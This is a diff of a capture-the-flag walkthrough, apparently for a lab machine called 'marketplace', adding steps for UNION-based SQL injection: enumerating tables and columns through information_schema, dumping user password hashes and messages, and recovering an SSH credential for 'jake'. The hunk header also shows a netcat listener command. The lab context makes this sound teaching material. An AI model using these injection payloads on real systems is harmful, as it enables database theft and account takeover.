@@ -187,18 +187,68 @@ nc -lvkp <port>
 
 --> Success, the error message has gone, and the article is being displayed, but now we want to display our data instead of the article. The article is displayed because it takes the first returned result somewhere in the website's code and shows that. To get around that, we need the first query to produce no results. This can simply be done by changing the article ID from 1 to 0.
 
+![alt text](image-18.png)
 
-items,messages,users
-table users: id, isAdministrator,password,username
-table messages: id,is_read,message_content,user_from,user_to
++ You'll now see the article is just made up of the result from the UNION select, returning the column values 1, 2, 3 and 4. We can start using these returned values to retrieve more useful information. First, we'll get the database name that we have access to:
+
+![alt text](image-19.png)
+
+--> We'll now see where the number 1 was previously displayed; it now shows the name of the database, which is "marketplace"
+
++ We use next query to gather a list of tables that are in this database:
+
+```bash
+5 UNION SELECT group_concat(table_name),2,3,4 FROM information_schema.tables WHERE table_schema='marketplace'
+```
+### group_concat: the method gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas.
+### information_schema database: every user of the database has access to this, and it contains information about all the databases and tables the user has access to.
+
+![alt text](image-20.png)
+
++ We have 3 tables name as " items, messages, users"
++ Next we will extract the columns in each table_name.
+
+```bash
+5 UNION SELECT group_concat(column_name),2,3,4 FROM information_schema.columns WHERE table_name='items'
+```
+
+![alt text](image-21.png)
+
+```bash
+5 UNION SELECT group_concat(column_name),2,3,4 FROM information_schema.columns WHERE table_name='messages'
+```
+
+![alt text](image-22.png)
+
+```bash
+5 UNION SELECT group_concat(column_name),2,3,4 FROM information_schema.columns WHERE table_name='users'
+```
+
+![alt text](image-23.png)
+
++ After all we have the columns, we will extract all of the rows into one strings and make it easier to read.
+
+```bash
+5 UNION SELECT group_concat(id, ':' , isAdministrator, ':' , password, ':' , username SEPARATOR '<br>'),2,3,4 FROM users
+```
 
 ![alt text](image-12.png)
 
-```bash
-http://<IP>/admin?user=5%20UNION%20SELECT%20group_concat(id,%20%27:%27%20,%20is_read,%20%27:%27%20,%20message_content,%20%27:%27%20,%20user_from,%20%27:%27%20,%20user_to%20SEPARATOR%20%27%3Cbr%3E%27),2,3,4%20FROM%20messages
+### Note: We've also added ,':', to split the username and password from each other. Instead of being separated by a comma, we've chosen the HTML <br> tag that forces each result to be on a separate line to make for easier reading.
 
+--> We have the password hashed but we are not able to de hash it so we will move to another table to find information.
+
++ We've moved to table_name "messages": 
+
+```bash
+5 UNION SELECT group_concat(id, ':' , is_read, ':' , message_content, ':' , user_from, ':' , user_to '<br>'),2,3,4 FROM messages
 ```
 ![alt text](image-13.png)
 
---> We have the credential SSH jake:@b_ENXkGYUCAv3zJ
+--> We have the credential SSH jake:@b_ENXkGYUCAv3zJ.
+
+
+
+
+
 
